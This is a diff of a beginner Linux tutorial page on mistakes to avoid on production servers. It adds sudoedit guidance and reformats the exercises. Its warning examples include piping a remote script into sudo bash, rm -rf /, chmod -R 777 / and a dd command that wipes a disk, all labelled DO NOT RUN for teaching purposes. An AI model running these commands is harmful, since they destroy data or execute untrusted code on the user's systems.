@@ -6,7 +6,7 @@ description: Learn what NOT to do on a production Linux server. The rules exist 
 # The "Don't Do This" Guide
 
 !!! tip "Part of Day One"
-    This is the final article in the [Day One: Getting Started](overview.md) series. Read this before making any changes to a production server.
+    This is the seventh and final article in the [Day One: Getting Started](overview.md) series. Read this before making any changes to a production server.
 
 You've learned what to do on a production server. Now let's talk about what **not** to do.
 
@@ -22,7 +22,7 @@ These aren't hypothetical dangers. Every rule here exists because someone (often
 
 Someone in a forum says "just run this":
 
-``` bash title="DO NOT RUN THIS"
+``` bash title="DO NOT RUN THIS" linenums="1"
 curl -s http://sketchy-site.com/fix.sh | sudo bash
 ```
 
@@ -71,7 +71,7 @@ Development → Staging → Production
 
 `rm` doesn't move files to trash. It destroys them. Forever.
 
-``` bash title="DANGEROUS - DO NOT RUN"
+``` bash title="DANGEROUS - DO NOT RUN" linenums="1"
 rm -rf /                    # Deletes EVERYTHING
 rm -rf /*                   # Also deletes EVERYTHING
 rm -rf /home/*              # Deletes all user data
@@ -86,22 +86,24 @@ rm -rf ./*                  # Deletes everything in current directory
 
 **Safer alternatives:**
 
-``` bash title="Safer Deletion"
+``` bash title="Safer Deletion" linenums="1"
 # Check what you're about to delete first
 ls /path/to/delete
 
 # Remove without -f so you get prompts
-rm -ri /path/to/delete
+rm -ri /path/to/delete  # (1)!
 
 # Use trash-cli if available
 trash-put /path/to/delete
 ```
 
+1. `-r` still recurses into directories, but dropping `-f` and adding `-i` makes `rm` **i**nteractive — it prompts before deleting each file. Slower, but it catches mistakes before they happen.
+
 ---
 
 ### chmod 777 - The Security Disaster
 
-``` bash title="DANGEROUS - DO NOT RUN"
+``` bash title="DANGEROUS - DO NOT RUN" linenums="1"
 chmod 777 /var/www/app        # Anyone can read/write/execute
 chmod -R 777 /                # Security nightmare
 ```
@@ -116,7 +118,7 @@ chmod -R 777 /                # Security nightmare
 
 **What to do instead:**
 
-``` bash title="Proper Permissions"
+``` bash title="Proper Permissions" linenums="1"
 # Make file readable by owner and group
 chmod 640 /path/to/file
 
@@ -131,7 +133,7 @@ ls -la /path/to/file
 
 ### Restarting Services in Production
 
-``` bash title="THINK BEFORE RUNNING"
+``` bash title="THINK BEFORE RUNNING" linenums="1"
 sudo systemctl restart nginx
 sudo service mysql restart
 sudo reboot
@@ -154,7 +156,7 @@ These commands cause **downtime**. Even "restart" has a brief interruption.
 - Schedule a maintenance window if needed
 - Use `reload` instead of `restart` when possible (zero-downtime config reload)
 
-``` bash title="Reload vs Restart"
+``` bash title="Reload vs Restart" linenums="1"
 sudo systemctl reload nginx  # Reloads config without dropping connections
 sudo systemctl restart nginx # Full restart, connections dropped
 ```
@@ -163,7 +165,7 @@ sudo systemctl restart nginx # Full restart, connections dropped
 
 ### Writing to System Files
 
-``` bash title="DANGEROUS - DO NOT RUN"
+``` bash title="DANGEROUS - DO NOT RUN" linenums="1"
 echo "something" > /etc/hosts
 cat something > /etc/passwd
 > /var/log/syslog  # Truncates the log file
@@ -180,12 +182,12 @@ The `>` operator **overwrites** files. The `>>` operator appends. One wrong char
 
 **Safer approach:**
 
-``` bash title="Safer File Editing"
+``` bash title="Safer File Editing" linenums="1"
 # Make a backup first
 sudo cp /etc/hosts /etc/hosts.backup
 
-# Use an editor (you can see what you're changing)
-sudo vim /etc/hosts
+# Edit safely — sudoedit opens a temp copy in your preferred editor
+sudoedit /etc/hosts
 
 # Verify the change
 cat /etc/hosts
@@ -197,7 +199,7 @@ cat /etc/hosts
 
 `dd` is powerful and dangerous. It writes raw data to devices.
 
-``` bash title="WILL DESTROY YOUR DISK"
+``` bash title="WILL DESTROY YOUR DISK" linenums="1"
 sudo dd if=/dev/zero of=/dev/sda  # Wipes the primary disk
 ```
 
@@ -209,29 +211,42 @@ If you see `dd` in a command, be extremely careful about the `of=` target. A wro
 
 ### Editing Config Files Directly
 
-``` bash title="RISKY"
+``` bash title="RISKY" linenums="1"
 sudo vim /etc/nginx/nginx.conf
 ```
 
 This isn't dangerous by itself, but:
 
 - One syntax error can break the service
-- You might forget to reload the service
-- You have no record of what changed
+- You might accidentally save a half-finished edit
+- Your preferred editor may not be vim
 
-**Better approach:**
+**The right tool: `sudoedit`**
 
-``` bash title="Safer Config Editing"
-# Test the config before editing
-sudo nginx -t
+`sudoedit` (also spelled `sudo -e`) is the correct way to edit system files. It:
 
-# Make a backup
-sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
+1. Makes a temporary copy of the file
+2. Opens it in **your user's default editor** (set by your `$EDITOR` environment variable — nano, vim, whatever you prefer)
+3. Only writes back to the original if you save and exit cleanly
 
-# Edit
-sudo vim /etc/nginx/nginx.conf
+If you abort or make an error and don't save, the original file is untouched.
 
-# Test again
+``` bash title="The Safe Way to Edit System Files" linenums="1"
+sudoedit /etc/nginx/nginx.conf
+# or equivalently:
+sudo -e /etc/nginx/nginx.conf
+```
+
+**Set your preferred editor** (add to your `~/.bashrc` or `~/.zshrc`):
+
+``` bash title="Set Your Editor" linenums="1"
+export EDITOR=nano   # or vim, micro, etc.
+```
+
+**After editing, test and reload:**
+
+``` bash title="Test and Reload" linenums="1"
+# Test the config
 sudo nginx -t
 
 # Only reload if test passes
@@ -240,13 +255,13 @@ sudo systemctl reload nginx
 
 ### Running Scripts Without Reading Them
 
-``` bash title="RISKY"
+``` bash title="RISKY" linenums="1"
 sudo ./fix-everything.sh
 ```
 
 **Always read the script first:**
 
-``` bash title="Check Script Contents"
+``` bash title="Check Script Contents" linenums="1"
 cat ./fix-everything.sh
 less ./fix-everything.sh
 ```
@@ -288,46 +303,46 @@ If any answer is "no", **stop and get help**.
 
 ---
 
-## Practice Exercises
+## Practice Problems
 
-??? question "Exercise 1: Safe Config Edit Workflow"
+??? question "Problem 1: Safe Config Edit Workflow"
     You need to check the `worker_processes` setting in `/etc/nginx/nginx.conf`. Walk through the safe approach: backup, view, verify — without actually changing anything.
 
     **Hint:** Three steps — backup the file, read it, validate the syntax.
 
-??? tip "Solution"
-    ```bash title="Safe Config Inspection Workflow"
-    # 1. Make a backup (even before read-only inspection, if you might edit later)
-    sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
+    ??? tip "Answer"
+        ```bash title="Safe Config Inspection Workflow" linenums="1"
+        # 1. Make a backup (even before read-only inspection, if you might edit later)
+        sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
 
-    # 2. Read the config (safe, read-only)
-    grep "worker_processes" /etc/nginx/nginx.conf
+        # 2. Read the config (safe, read-only)
+        grep "worker_processes" /etc/nginx/nginx.conf
 
-    # 3. Validate current syntax (before touching anything)
-    sudo nginx -t
-    ```
+        # 3. Validate current syntax (before touching anything)
+        sudo nginx -t
+        ```
 
-    If you did edit and broke something:
-    ```bash title="Restore from Backup"
-    sudo cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf
-    sudo nginx -t
-    sudo systemctl reload nginx
-    ```
+        If you did edit and broke something:
+        ```bash title="Restore from Backup" linenums="1"
+        sudo cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf
+        sudo nginx -t
+        sudo systemctl reload nginx
+        ```
 
-??? question "Exercise 2: The Pre-Change Checklist"
+??? question "Problem 2: The Pre-Change Checklist"
     Your team lead asks you to restart the `mysql` service on a production server. Before touching the keyboard, what questions do you need answers to?
 
-??? tip "Solution"
-    Work through the production safety checklist:
+    ??? tip "Answer"
+        Work through the production safety checklist:
 
-    1. **Do I understand what `systemctl restart mysql` does?** — Brief downtime. All active connections will drop.
-    2. **Have I tested this in staging?** — Is there a staging server to verify first?
-    3. **Do I have a rollback plan?** — If MySQL doesn't come back up, what's the procedure?
-    4. **Does anyone else need to know?** — Is anyone currently using the database? Alert the team first.
-    5. **Is there a change management process?** — Does this require a ticket, approval, or maintenance window?
-    6. **Am I comfortable explaining this to my team lead?** — If not, ask before acting.
+        1. **Do I understand what `systemctl restart mysql` does?** — Brief downtime. All active connections will drop.
+        2. **Have I tested this in staging?** — Is there a staging server to verify first?
+        3. **Do I have a rollback plan?** — If MySQL doesn't come back up, what's the procedure?
+        4. **Does anyone else need to know?** — Is anyone currently using the database? Alert the team first.
+        5. **Is there a change management process?** — Does this require a ticket, approval, or maintenance window?
+        6. **Am I comfortable explaining this to my team lead?** — If not, ask before acting.
 
-    If any answer is "no" or "I don't know" — stop and ask before proceeding.
+        If any answer is "no" or "I don't know" — stop and ask before proceeding.
 
 ## When Things Go Wrong
 
@@ -373,14 +388,14 @@ Ctrl+C
 
 If you just edited a file and the service is broken:
 
-``` bash title="Restore Backup"
+``` bash title="Restore Backup" linenums="1"
 sudo cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf
 sudo systemctl reload nginx
 ```
 
 ### Check What Changed
 
-``` bash title="Diff Against Backup"
+``` bash title="Diff Against Backup" linenums="1"
 diff /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
 ```
 
@@ -439,13 +454,9 @@ Congratulations! You now know how to:
 - ✅ Understand your permissions
 - ✅ Explore safely
 - ✅ Read logs like a pro
-- ✅ Find documentation and help
-- ✅ Perform common first tasks
+- ✅ Find documentation and understand what's running
 - ✅ Avoid dangerous mistakes
 
 **What's next?**
 
-Ready to keep leveling up? **Level 1: Everyday Navigation** is coming soon — covering the daily commands you'll use on any Linux system. In the meantime, head back to the [Day One overview](overview.md) to review everything you've covered.
-
-!!! success "You're Going to Be Fine"
-    Everyone who's comfortable on Linux servers started exactly where you are now. The fact that you read a safety guide before diving in shows good instincts. Keep asking questions, keep learning, and you'll be the one helping new people before you know it.
+The **Essentials** track covers the tools Linux professionals use every day — filesystem layout, file permissions, grep, pipes, and more. Head back to the [Day One overview](overview.md) in the meantime.
